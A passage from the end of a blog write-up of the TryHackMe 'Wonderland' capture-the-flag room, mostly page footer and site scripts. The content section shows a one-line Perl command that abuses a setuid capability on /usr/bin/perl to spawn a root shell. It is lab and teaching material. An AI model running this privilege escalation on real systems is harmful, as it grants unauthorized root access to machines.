+<p>We see that the program <code>/usr/bin/perl</code> has the capability <code>setuid</code>.
+So, we can exploit this and get command execution with root.</p>
+<p>The privilege escalation using capabilities has been explained well at <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities">hacktricks</a></p>
+<p>We can find the privesc method using perl and its capability on <a href="https://gtfobins.github.io/gtfobins/perl/#capabilities">gtfobins</a>.</p>
+<p>Following that, we execute the following to get our root shell.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>/usr/bin/perl -e <span style="color:#ed9d13">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/sh&#34;;&#39;</span>
+</code></pre></div><p>And we get the root shell. Now, we can read our root.txt.</p>
+<p><img src="/img/tryhackme_wonderland/12.png" alt=""></p>
+<p>PS. In this box, as the hint suggests, everything is upside down, meaning
+root.txt is in users&rsquo; home, and user.txt is in /root.</p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-wonderland-writeup/" title="TryHackMe - Wonderland Writeup" target="_blank" rel="external">https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-wonderland-writeup/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/fmash16" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://fmash16.github.io/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/fmash16" target="_blank"><span class="text-dark">fmash16</span></a></h3>
+        <div>Hack the Planet</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-book-writeup/" title="Hackthebox - Book Writeup"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-resolute-writeup/"
+                    title="Hackthebox - Resolute Writeup"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Index</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="facebook,twitter"
+                data-mobile-sites="">Share on:</div>
+        </div>
+    </div>
+</nav>
+
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/fmash16" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://fmash16.github.io/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+    <li><a href="https://twitter.com/fmash16" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-twitter"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;2020  -
+    2020
+    
+    
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"></script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://fmash16.github.io/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="https://fmash16.github.io/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+            },
+            ROOT_URL: 'https:\/\/fmash16.github.io\/',
+            CONTENT_URL: 'https:\/\/fmash16.github.io\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://fmash16.github.io/js/insight.min.7f3407251ef14950645ac695d0cf7cd29c5cabfb6916e63dcb54b83d8f1fc2126d10bd5446875e78d27a76ecd651a3532b49a7e4da02ee4de51660edba2d23f1.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+/* copy code button */
+<script>
+function addCopyButtons(clipboard) {
+    document.querySelectorAll('pre > code').forEach(function (codeBlock) {
+        var button = document.createElement('button');
+        button.className = 'copy-code-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        button.addEventListener('click', function () {
+              
+            tmp = codeBlock.innerText.split("\n");
+            cutChar = (tmp.length>8) ? 2 : 1;
+            for(i=0; i<tmp.length; i++){
+              tmp[i] = tmp[i].substring(cutChar);
+            }
+            block = tmp.join("\n");
+            clipboard.writeText(block).then(function () {
+                
+
+                button.blur();
+
+                button.innerText = 'Copied!';
+
+                setTimeout(function () {
+                    button.innerText = 'Copy';
+                }, 2000);
+            }, function (error) {
+                button.innerText = 'Error';
+            });
+        });
+
+        var pre = codeBlock.parentNode;
+        if (pre.parentNode.classList.contains('highlight')) {
+            var highlight = pre.parentNode;
+            highlight.parentNode.insertBefore(button, highlight);
+        } else {
+            pre.parentNode.insertBefore(button, pre);
+        }
+    });
+}
+if (navigator && navigator.clipboard) {
+    addCopyButtons(navigator.clipboard);
+} else {
+    var script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard-polyfill/2.7.0/clipboard-polyfill.promise.js';
+    script.integrity = 'sha256-waClS2re9NUbXRsryKoof+F9qc1gjjIhc2eT7ZbIv94=';
+    script.crossOrigin = 'anonymous';
+    script.onload = function() {
+        addCopyButtons(clipboard);
+    };
+
+    document.body.appendChild(script);
+}
+
+</script>
+
+
+
+  </body>
+</html>
